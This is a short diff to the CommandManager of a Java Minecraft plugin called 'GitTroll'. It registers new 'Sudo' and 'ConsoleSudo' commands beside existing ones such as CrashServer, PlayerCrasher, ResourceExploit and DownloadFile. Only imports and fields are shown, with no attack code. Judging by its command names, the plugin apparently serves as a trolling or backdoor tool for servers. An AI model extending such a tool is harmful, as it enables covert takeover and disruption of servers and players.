@@ -29,6 +29,7 @@ import net.Lenni0451.GitTroll.command.commands.exploits.ResourceExploit;
 import net.Lenni0451.GitTroll.command.commands.player.Deop;
 import net.Lenni0451.GitTroll.command.commands.player.Heal;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
+import net.Lenni0451.GitTroll.command.commands.player.Sudo;
 import net.Lenni0451.GitTroll.command.commands.player.Title;
 import net.Lenni0451.GitTroll.command.commands.player.Trust;
 import net.Lenni0451.GitTroll.command.commands.player.UnhookPacketListener;
@@ -36,6 +37,7 @@ import net.Lenni0451.GitTroll.command.commands.player.Untrust;
 import net.Lenni0451.GitTroll.command.commands.player.Vanish;
 import net.Lenni0451.GitTroll.command.commands.plugin.Help;
 import net.Lenni0451.GitTroll.command.commands.plugin.UpdateVersion;
+import net.Lenni0451.GitTroll.command.commands.server.ConsoleSudo;
 import net.Lenni0451.GitTroll.command.commands.server.CrashServer;
 import net.Lenni0451.GitTroll.command.commands.server.DownloadFile;
 import net.Lenni0451.GitTroll.command.commands.server.Plugins;
@@ -98,6 +100,8 @@ public class CommandManager implements Listener {
 	public final PlayerCrasher PlayerCrasher = null;
 	public final ClientBlockReplace ClientBlockReplace = null;
 	public final ChunkRenderGlitch ChunkRenderGlitch = null;
+	public final Sudo Sudo = null;
+	public final ConsoleSudo ConsoleSudo = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
